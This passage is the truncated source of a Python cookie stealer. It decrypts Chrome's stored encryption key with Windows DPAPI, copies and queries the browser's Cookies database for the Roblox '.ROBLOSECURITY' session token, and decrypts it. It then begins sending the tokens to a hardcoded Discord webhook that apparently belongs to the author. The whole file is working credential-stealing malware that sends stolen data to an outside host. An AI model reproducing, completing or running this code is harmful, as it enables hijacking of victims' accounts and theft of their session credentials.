
import os
import sqlite3
import base64
import json
import shutil
import requests
import win32crypt
from Cryptodome.Cipher import AES

WEBHOOK_URL = "https://discord.com/api/webhooks/1407724980418117774/SgpprQRHcLOkiyGPEuY_oB1_HYZZlbKpGgFQYptrgVAxgYUw6p6Z1KHYhkrzpn64NFII"  # Replace with your webhook

def get_chrome_key():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # remove DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_cookie(encrypted_value, key):
    try:
        if encrypted_value[:3] == b'v10':
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
    except:
        return None

def grab_roblosecurity_from_browser():
    results = []
    chrome_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Network\Cookies")
    if not os.path.exists(chrome_path):
        return results

    key = get_chrome_key()
    db_path = "Cookies_copy.db"
    shutil.copy2(chrome_path, db_path)

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
    
    for host_key, name, encrypted_value in cursor.fetchall():
        cookie_val = decrypt_cookie(encrypted_value, key)
        if cookie_val and cookie_val not in results:
            results.append(cookie_val)

    cursor.close()
    conn.close()
    os.remove(db_path)
    return results

def send_to_webhook(tokens):
    if not tokens:
        return
    data = {
        "content": "**Roblox